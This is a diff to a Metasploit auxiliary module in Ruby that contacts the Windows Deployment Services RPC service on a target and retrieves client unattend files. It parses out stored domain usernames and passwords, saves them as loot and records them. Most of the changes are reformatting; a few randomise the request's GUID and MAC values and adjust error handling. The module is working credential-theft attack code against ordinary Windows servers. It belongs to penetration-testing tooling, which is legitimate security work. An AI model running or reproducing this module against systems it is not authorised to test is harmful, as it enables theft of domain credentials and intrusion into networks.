@@ -26,9 +26,9 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',
       'Description'    => %q{
-            This module retrieves the client unattend file from Windows
-            Deployment Services RPC service and parses out the stored credentials.
-            Tested against Windows 2008 R2 x64 and Windows 2003 x86.
+        This module retrieves the client unattend file from Windows
+        Deployment Services RPC service and parses out the stored credentials.
+        Tested against Windows 2008 R2 x64 and Windows 2003 x86.
       },
       'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
       'License'        => MSF_LICENSE,
@@ -53,26 +53,24 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-      begin
-        query_host(ip)
-      rescue ::Interrupt
-          raise $!
-      rescue ::Exception => e
-          print_error("#{ip}:#{rport} error: #{e}")
-      end
+    begin
+      query_host(ip)
+    rescue ::Interrupt
+      raise $!
+    rescue ::Exception => e
+      print_error("#{ip}:#{rport} error: #{e}")
+    end
   end
 
   def query_host(rhost)
     # Create a handler with our UUID and Transfer Syntax
-    ndr86 = '8a885d04-1ceb-11c9-9fe8-08002b104860'
-    version = 2
+    ndr86 = DCERPCUUID.xfer_syntax_uuid
+    version = DCERPCUUID.xfer_syntax_vers
 
     self.handle = Rex::Proto::DCERPC::Handle.new(
       [
         WDS_CONST::WDSCP_RPC_UUID,
         '1.0',
-        ndr86,
-        version,
       ],
       'ncacn_ip_tcp',
       rhost,
@@ -85,11 +83,11 @@ class Metasploit3 < Msf::Auxiliary
     print_good("Bound to #{handle}")
 
     report_service(
-        :host => rhost,
-        :port => datastore['RPORT'],
-        :proto => 'tcp',
-        :name => "dcerpc",
-        :info => "#{WDS_CONST::WDSCP_RPC_UUID} v1.0 Windows Deployment Services"
+      :host => rhost,
+      :port => datastore['RPORT'],
+      :proto => 'tcp',
+      :name => "dcerpc",
+      :info => "#{WDS_CONST::WDSCP_RPC_UUID} v1.0 Windows Deployment Services"
     )
 
     table = Rex::Ui::Text::Table.new({
@@ -110,7 +108,8 @@ class Metasploit3 < Msf::Auxiliary
         result = request_client_unattend(architecture)
       rescue ::Rex::Proto::DCERPC::Exceptions::Fault => e
         vprint_error(e.to_s)
-        fail_with(Failure::Unknown, "#{rhost} DCERPC Fault - Windows Deployment Services is present but not configured. Perhaps an SCCM installation.")
+        print_error("#{rhost} DCERPC Fault - Windows Deployment Services is present but not configured. Perhaps an SCCM installation.")
+        return
       end
 
       unless result.nil?
@@ -145,15 +144,16 @@ class Metasploit3 < Msf::Auxiliary
     # Construct WDS Control Protocol Message
     packet = Rex::Proto::DCERPC::WDSCP::Packet.new(:REQUEST, :GET_CLIENT_UNATTEND)
 
-    guid = '11223344556677578058C2C04F503931'
+    guid = Rex::Text.rand_text_hex(32)
     packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_GUID, guid)
 
     # Not sure what this padding is for...
     mac = [0x30].pack('C') * 20
-    mac << "000c29e0bab8"
+    mac << Rex::Text.rand_text_hex(12)
     packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_MAC, mac)
 
-    packet.add_var(	WDS_CONST::VAR_NAME_ARCHITECTURE, [architecture[1]].pack('C'))
+    arch = [architecture[1]].pack('C')
+    packet.add_var(	WDS_CONST::VAR_NAME_ARCHITECTURE, arch)
 
     version = [1].pack('V')
     packet.add_var(	WDS_CONST::VAR_NAME_VERSION, version)
@@ -168,7 +168,6 @@ class Metasploit3 < Msf::Auxiliary
       data = dcerpc.last_response.stub_data
 
       # Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000
-      #puts data.unpack('v*').inspect
       op_error_code = data.unpack('v*')[19]
       if op_error_code == 0
         if data.length < 277
@@ -203,20 +202,20 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def loot_unattend(archi, data)
-      return if data.empty?
-      p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
-      print_status("Raw version of #{archi} saved as: #{p}")
+    return if data.empty?
+    p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
+    print_status("Raw version of #{archi} saved as: #{p}")
   end
 
   def report_creds(domain, user, pass)
     report_auth_info(
-        :host  => rhost,
-        :port => 4050,
-        :sname => 'dcerpc',
-        :proto => 'tcp',
-        :source_id => nil,
-        :source_type => "aux",
-        :user => "#{domain}\\#{user}",
-        :pass => pass)
+      :host  => rhost,
+      :port => 4050,
+      :sname => 'dcerpc',
+      :proto => 'tcp',
+      :source_id => nil,
+      :source_type => "aux",
+      :user => "#{domain}\\#{user}",
+      :pass => pass)
   end
 end
